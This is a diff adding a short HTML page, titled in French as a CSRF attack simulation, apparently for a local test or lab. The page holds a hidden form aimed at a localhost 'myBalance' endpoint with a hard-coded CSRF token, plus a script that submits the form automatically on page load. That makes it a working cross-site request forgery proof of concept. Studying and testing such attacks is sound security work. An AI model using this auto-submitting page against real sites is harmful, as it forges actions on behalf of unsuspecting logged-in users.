@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Simulation d'attaque CSRF</title>
+</head>
+<body>
+	<h1>Simulation d'attaque CSRF</h1>
+	<form id="csrf-form" action="http://localhost:8083/myBalance" method="post">
+		<input type="hidden" name="input" value="YOUR_CSRF_TOKEN_HERE">
+		<button type="submit">Soumettre la requête</button>
+<input type="hidden" name="_csrf" value="_lrElp36gTjHNbvOOxkrCvX0myVP51YXGk26dWNK9mUL1mNAmz79pP6ftAjqA96oCjQfP8PGthx-gTM6fnmPQ1Z_kFM7tQF1">
+	</form>
+	<script>
+		// Soumettre automatiquement le formulaire lorsque la page est chargée
+		document.getElementById('csrf-form').submit();
+	</script>
+</body>
+</html>
